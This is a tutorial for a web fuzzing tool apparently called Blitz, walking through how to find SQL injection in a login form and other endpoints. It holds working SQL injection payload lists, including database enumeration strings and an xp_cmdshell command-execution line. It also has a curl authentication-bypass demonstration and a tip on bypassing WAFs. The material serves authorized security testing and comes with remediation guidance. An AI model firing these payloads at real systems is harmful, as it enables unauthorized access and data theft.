# Tutorial: Finding SQL Injection with Blitz

## Overview

This tutorial demonstrates how to use Blitz to discover SQL injection vulnerabilities in web applications. We'll cover both manual payload testing and AI-powered discovery.

**Learning Objectives:**
- Understand SQL injection basics
- Create effective request templates
- Use AI-generated SQLi payloads
- Analyze and validate findings
- Generate professional reports

**Prerequisites:**
- Blitz installed and configured
- Basic understanding of HTTP requests
- Permission to test the target application

**Time Required:** 30 minutes

## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers can:
- Bypass authentication
- Extract sensitive data
- Modify or delete data
- Execute administrative operations

**Common SQLi Types:**
1. **Error-based:** Trigger database errors to extract information
2. **Union-based:** Use UNION to combine results
3. **Boolean-based blind:** Infer data from true/false responses
4. **Time-based blind:** Use delays to confirm vulnerabilities

## Scenario: Testing a Login Form

### Target Application

We have a login form at `http://vulnerable-app.local/login` that accepts JSON credentials:

```json
{
  "username": "admin",
  "password": "password123"
}
```

### Step 1: Capture the Request

First, capture a legitimate login request. You can use:
- Browser Developer Tools (Network tab)
- Burp Suite Proxy
- curl with `-v` flag

**Captured Request:**

```http
POST /api/login HTTP/1.1
Host: vulnerable-app.local
Content-Type: application/json
Content-Length: 48

{"username":"admin","password":"password123"}
```

### Step 2: Create Request Template

Save the request to a file `login-template.txt` with position markers:

```http
POST /api/login HTTP/1.1
Host: vulnerable-app.local
Content-Type: application/json

{"username":"{{user}}","password":"{{pass}}"}
```

**Key Points:**
- `{{user}}` marks the username injection point
- `{{pass}}` marks the password injection point
- Both fields are potential SQLi targets

### Step 3: Manual SQLi Testing

Let's test with common SQL injection payloads.

**Create a payload file** (`sqli-payloads.txt`):

```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin' #
admin'/*
' or 1=1--
" or 1=1--
or 1=1--
' or 'x'='x
" or "x"="x
') or ('x'='x
' OR 1=1#
" OR 1=1#
') OR ('1'='1
")) OR (("1"="1
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
admin' OR '1'='1
admin' OR 1=1--
admin') OR ('1'='1
```

**Run Blitz with Sniper attack:**

```bash
0xgenctl blitz run \
  --template login-template.txt \
  --payload @sqli-payloads.txt \
  --attack-type sniper \
  --concurrency 5 \
  --output login-sqli-test.db
```

**Expected Output:**

```
[*] Starting Blitz fuzzer...
[*] Session ID: blitz-20250113-123456
[*] Positions: 2 (user, pass)
[*] Payloads per position: 20
[*] Attack type: sniper
[*] Total jobs: 40 (2 positions × 20 payloads)

[+] Baseline request: Status 401, Length 45
[+] Anomaly detected! Position: user, Payload: ' OR '1'='1, Status: 200, Length: 523
[!] Status code changed from 401 to 200 - possible bypass!

Progress: 40/40 (100%) | RPS: 5.2 | Completed in 8s
[*] Found 3 interesting results
[*] Results saved to: login-sqli-test.db
```

### Step 4: Analyze Results

Query the database for interesting findings:

```bash
sqlite3 login-sqli-test.db "
  SELECT
    id,
    position_name,
    payload,
    status_code,
    content_len,
    anomaly_status_code_anomaly
  FROM results
  WHERE anomaly_interesting = 1
  ORDER BY id;
"
```

**Sample Output:**

```
id|position_name|payload|status_code|content_len|anomaly_status_code_anomaly
2|user|' OR '1'='1|200|523|1
15|user|admin' OR 1=1--|200|523|1
23|pass|' OR '1'='1'--|200|523|1
```

**Interpretation:**
- Baseline returned 401 (Unauthorized) with length 45
- Three payloads returned 200 (OK) with length 523
- Status code change indicates authentication bypass
- All three payloads suggest SQL injection vulnerability

### Step 5: Validate the Vulnerability

**Manual Verification:**

Use curl to confirm the finding:

```bash
curl -X POST http://vulnerable-app.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR '\''1'\''='\''1","password":"anything"}' \
  -v
```

**Expected Response:**

```json
HTTP/1.1 200 OK
{
  "success": true,
  "message": "Login successful",
  "user": {
    "id": 1,
    "username": "admin",
    "role": "administrator"
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

✅ **Confirmed!** The application is vulnerable to SQL injection, allowing authentication bypass.

## Advanced: AI-Powered SQLi Discovery

Let's use Blitz's AI features to automatically detect and classify SQL injection.

### Step 1: Run with AI Features

```bash
0xgenctl blitz run \
  --template login-template.txt \
  --ai-payloads \
  --ai-classify \
  --ai-findings \
  --findings-output sqli-findings.jsonl \
  --attack-type sniper \
  --output login-ai-test.db
```

**What happens:**
1. **AI Payload Selection:** Blitz analyzes the request and generates SQLi payloads relevant to login forms
2. **AI Classification:** Responses are classified for SQL error patterns
3. **Findings Correlation:** Interesting results are converted to 0xGen findings with CWE/OWASP mapping

**Output:**

```
[*] Starting Blitz fuzzer with AI features...
[*] AI analyzing request template...
[*] Detected parameters: user (query), pass (body)
[*] Selected vulnerability categories: sqli, auth_bypass
[*] Generated 45 AI payloads

[+] Baseline: Status 401, Length 45

[+] Anomaly! Payload: ' OR '1'='1, Status: 200, Length: 523
[!] AI Classification: auth_bypass (confidence: 0.85)
[!] Finding created: finding-auth-bypass-001

[+] Anomaly! Payload: admin' --, Status: 500, Length: 1842
[!] AI Classification: sql_error (confidence: 0.95)
[!] Evidence: "You have an error in your SQL syntax"
[!] Finding created: finding-sql-error-002

Progress: 45/45 (100%) | Findings: 2 | Completed
```

### Step 2: Review AI Findings

**View findings file:**

```bash
cat sqli-findings.jsonl | jq
```

**Example Finding:**

```json
{
  "version": "1.0",
  "id": "finding-sql-error-002",
  "plugin": "blitz",
  "type": "blitz.sql_error",
  "message": "MySQL syntax error detected - likely SQL injection vulnerability",
  "target": "http://vulnerable-app.local/api/login",
  "evidence": "Payload: admin' --\n\nMatched Pattern: You have an error in your SQL syntax\n\nResponse Preview: {\"error\":\"Database error: You have an error in your SQL syntax; check the manual...\"}",
  "severity": "high",
  "detected_at": "2025-01-13T10:35:22Z",
  "metadata": {
    "blitz_session": "blitz-20250113-123456",
    "blitz_result_id": "18",
    "position": "user",
    "payload": "admin' --",
    "status_code": "500",
    "response_time_ms": "145",
    "content_length": "1842",
    "classification": "sql_error",
    "confidence": "0.95",
    "cwe": "CWE-89",
    "owasp": "A03:2021-Injection",
    "vulnerability_type": "SQL Injection",
    "poc_request": "POST /api/login HTTP/1.1\nHost: vulnerable-app.local\nContent-Type: application/json\n\n{\"username\":\"admin' --\",\"password\":\"{{pass}}\"}",
    "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
  }
}
```

**Key Information:**
- **Type:** `blitz.sql_error` (SQL injection detected)
- **Severity:** High
- **CWE:** CWE-89 (SQL Injection)
- **OWASP:** A03:2021-Injection
- **Evidence:** Full error message from database
- **PoC:** Proof-of-concept request included
- **Remediation:** Actionable fix recommendations

## Real-World Scenarios

### Scenario 1: GET Parameter SQLi

**Target:**

```http
GET /search?query={{search_term}}&category={{category}} HTTP/1.1
Host: shop.example.com
```

**Blitz Command:**

```bash
0xgenctl blitz run \
  -t search-request.txt \
  --ai-payloads \
  --ai-classify \
  --attack-type sniper \
  --concurrency 10
```

**AI-Generated Payloads:**
```
' OR '1'='1
1' UNION SELECT NULL,NULL,NULL--
1' AND 1=2 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
1' ORDER BY 10--
```

### Scenario 2: REST API SQLi

**Target:**

```http
GET /api/v1/users/{{user_id}} HTTP/1.1
Host: api.example.com
Authorization: Bearer {{token}}
```

**Blitz Command:**

```bash
0xgenctl blitz run \
  -t api-request.txt \
  -p "range:1-100" \
  -p @sqli-payloads.txt \
  --attack-type cluster-bomb \
  --ai-classify
```

### Scenario 3: Header-Based SQLi

Some applications use custom headers for lookups:

**Target:**

```http
GET /profile HTTP/1.1
Host: example.com
X-User-ID: {{user_id}}
```

**Blitz Command:**

```bash
0xgenctl blitz run \
  -t header-request.txt \
  --ai-payloads \
  --attack-type sniper
```

## Database-Specific Payloads

### MySQL

```
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1#
' UNION SELECT NULL, version()--
' AND 1=0 UNION SELECT NULL, user()--
' AND 1=0 UNION SELECT NULL, database()--
' UNION SELECT NULL, schema_name FROM information_schema.schemata--
' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database()--
```

### PostgreSQL

```
' OR '1'='1'--
' OR 1=1--
' UNION SELECT NULL, version()--
' UNION SELECT NULL, current_database()--
' UNION SELECT NULL, current_user--
' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables--
```

### Microsoft SQL Server

```
' OR '1'='1'--
' OR 1=1--
' UNION SELECT NULL, @@version--
' UNION SELECT NULL, DB_NAME()--
' UNION SELECT NULL, USER_NAME()--
'; EXEC xp_cmdshell('whoami')--
```

### Oracle

```
' OR '1'='1
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL, banner FROM v$version--
' UNION SELECT NULL, user FROM dual--
' UNION SELECT NULL, table_name FROM all_tables--
```

### SQLite

```
' OR '1'='1
' UNION SELECT NULL, sqlite_version()--
' UNION SELECT NULL, sql FROM sqlite_master--
' UNION SELECT NULL, name FROM sqlite_master WHERE type='table'--
```

## Best Practices

### 1. Establish Baseline

Always send a baseline request first to understand normal behavior.

### 2. Start with Error-Based Detection

Error-based SQLi is easiest to detect:
- Look for database error messages
- Monitor for 500 status codes
- Check for stack traces

### 3. Gradual Escalation

Start simple, then escalate:

1. **Basic payloads:** `' OR '1'='1`
2. **Comment injection:** `admin'--`
3. **UNION-based:** `' UNION SELECT NULL--`
4. **Database enumeration:** Extract schema information
5. **Data exfiltration:** Extract sensitive data

### 4. Use AI Classification

Let Blitz's AI identify SQL errors automatically:
- Reduces manual analysis
- Detects subtle vulnerabilities
- Provides CWE/OWASP mapping

### 5. Validate Findings

Always manually verify:
- Confirm the vulnerability exists
- Test different payloads
- Determine impact and exploitability

### 6. Rate Limiting

Respect the target application:
```bash
--rate-limit 10  # 10 requests per second
--concurrency 5  # 5 parallel requests
```

## Remediation

When reporting SQL injection findings, include remediation advice:

### Recommended Fixes

**1. Use Parameterized Queries (Best Practice)**

**Vulnerable Code:**

```python
# Bad - String concatenation
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
```

**Fixed Code:**

```python
# Good - Parameterized query
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```

**2. Use ORM Libraries**

```python
# Django ORM (safe)
User.objects.filter(username=username, password=password)

# SQLAlchemy (safe)
session.query(User).filter_by(username=username, password=password).first()
```

**3. Input Validation**

```python
import re

def validate_username(username):
    # Only allow alphanumeric + underscore
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Invalid username format")
    return username
```

**4. Principle of Least Privilege**

- Use database accounts with minimal permissions
- Read-only access where possible
- No access to system tables or procedures

**5. Web Application Firewall**

Deploy WAF rules to detect and block SQLi attempts:
- ModSecurity (OWASP Core Rule Set)
- AWS WAF
- Cloudflare WAF

## Generating Reports

### Export Findings to HTML

```bash
0xgenctl blitz export \
  --session login-ai-test.db \
  --format html \
  --filter anomaly \
  --output sqli-report.html
```

### Export for Further Analysis

```bash
# CSV for spreadsheets
0xgenctl blitz export \
  --session login-ai-test.db \
  --format csv \
  --output results.csv

# JSON for automated processing
0xgenctl blitz export \
  --session login-ai-test.db \
  --format json \
  --filter anomaly \
  --output anomalies.json
```

### Include in 0xGen Reports

Findings are automatically added to 0xGen's findings database and can be included in professional reports.

## Troubleshooting

### No SQL Errors Detected

If you don't see SQL errors:

1. **Application may be using generic error pages:** Look for other anomalies (status codes, response times, content length)
2. **Try blind SQLi payloads:** Time-based payloads like `' AND SLEEP(5)--`
3. **Check WAF blocking:** Adjust payloads to bypass filters
4. **Increase payload diversity:** Use database-specific syntax

### False Positives

If you get false positives:

1. **Verify manually:** Always confirm with curl or browser
2. **Check baseline:** Ensure baseline request is accurate
3. **Adjust AI confidence threshold:** Filter by higher confidence scores
4. **Review response content:** Look at actual error messages

### Rate Limiting

If you're being rate-limited:

```bash
--rate-limit 1      # 1 request per second
--concurrency 1     # No parallel requests
--timeout 30        # Increase timeout
```

## Summary

In this tutorial, you learned to:

✅ Capture and template HTTP requests
✅ Create effective position markers
✅ Use manual and AI-generated SQLi payloads
✅ Run Blitz with various attack types
✅ Analyze results for SQL injection indicators
✅ Validate findings manually
✅ Generate professional reports
✅ Provide remediation recommendations

## Next Steps

- [Tutorial: Fuzzing for XSS with AI Payloads](./TUTORIAL_XSS.md)
- [Blitz User Guide](./USER_GUIDE.md)
- [API Documentation](./API_DOCS.md)

## Additional Resources

- **OWASP SQL Injection:** https://owasp.org/www-community/attacks/SQL_Injection
- **CWE-89:** https://cwe.mitre.org/data/definitions/89.html
- **PortSwigger SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet
- **PayloadsAllTheThings SQLi:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

---

**Happy Hunting! 🎯**
